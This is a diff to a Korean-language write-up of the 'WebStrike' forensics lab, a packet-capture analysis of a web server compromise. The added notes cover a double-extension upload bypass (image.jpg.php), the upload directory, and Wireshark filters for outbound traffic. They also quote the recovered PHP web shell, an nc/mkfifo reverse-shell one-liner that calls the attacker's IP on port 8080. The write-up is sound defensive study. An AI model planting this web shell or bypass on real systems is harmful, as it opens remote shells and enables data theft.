@@ -61,11 +61,11 @@ image.jpg.php
 ### 분석
 ![WebStrike_Q3_1.png](./IMG/WebStrike_Q3_1.png)
 ![WebStrike_Q3_2.png](./IMG/WebStrike_Q3_2.png)
-첫 번째 공격 시도에서 image.php 라는 웹 쉘 업로드를 시도했으나 실패했다.
+첫 번째 공격 시도에서 image.php 라는 웹 쉘 업로드를 시도했으나 실패했다. (Invalid file format, 서버측 유효성 검사를 나타내는 오류 메세지)
 
 ![WebStrike_Q3_3.png](./IMG/WebStrike_Q3_3.png)
 ![WebStrike_Q3_4.png](./IMG/WebStrike_Q3_4.png)
-두 번째 공격 시도에서 파일명을 image.jpg.php로 변경한 후 업로드 하여 성공했다.
+두 번째 공격 시도에서 파일명을 image.jpg.php로 변경한 후 업로드 하여 성공했다. (서버의 필터링 매커니즘 우회)
 
 ## Q4
 Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?
@@ -84,7 +84,7 @@ Identifying the directory where uploaded files are stored is crucial for locatin
 
 ![WebStrike_Q4_2.png](./IMG/WebStrike_Q4_2.png)
 
-/reviews/uploads 시도 → moved permanetly
+/reviews/uploads 시도 → 301 moved permanetly (/reviews/uploads/ 디렉터리로 리다이렉션)
 
 ![WebStrike_Q4_3.png](./IMG/WebStrike_Q4_3.png)
 
@@ -102,9 +102,16 @@ Which port, opened on the attacker's machine, was targeted by the malicious web 
 
 ![WebStrike_Q5_1.png](./IMG/WebStrike_Q5_1.png)
 
-웹 쉘 실행 후 피해를 입은 ip 주소에서 공격자의 8080 포트로 먼저 접속이 되는걸 보면 리버스 쉘인가?
+웹 쉘 실행 후 피해를 입은 ip 주소에서 공격자의 8080 포트로 먼저 접속이 되는걸 보면 리버스 쉘로 보임
 
 ![WebStrike_Q5_1.png](./IMG/WebStrike_Q5_2.png)
+
+사용된 웹 쉘을 확인해 보자.
+netcat을 이용해서 서버가 117.11.88.124 주소의 8080 포트로 접속하여 쉘을 열게된다.
+
+```
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp /f|/bin/sh -i 2> &1|nc 117.11.88.124 8080 >/tmp/f "); ?>
+```
 
 ## Q6
 Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?
@@ -124,3 +131,14 @@ curl 명령어를 이용해 passwd 파일을 탈취해가는 것을 확인할 �
 8080 → 54448 은 공격자가 서버로 보내는 명령이고, 54448 → 8080은 서버가 공격자에게 보내는 값이다.
 
 # Write-up 비교 & 정리
+와이어 샤크에서 마우스 우클릭 후 Follow → HTTP Stream을 클릭하면 HTTP 패킷의 스트림을 확인할 수 있다.
+
+HTTP Stream: HTTP 프로토콜을 통해 데이터를 연속적으로 전송하는 방식
+
+Q6에서 write-up은 필터링을 이용했는데 방법은 다음과 같다.
+
+``(tcp.port==8080)&&(ip.src==24.49.63.79)``
+
+이 필터링은 피해자 서버 24.49.63.79에서 공격자의 포트인 8080 로 가는 아웃바운드 트래픽을 걸러낼 수 있게 된다. (반대는 인바운드 트래픽)
+
+![tmp_1.png](./IMG/tmp_1.png)
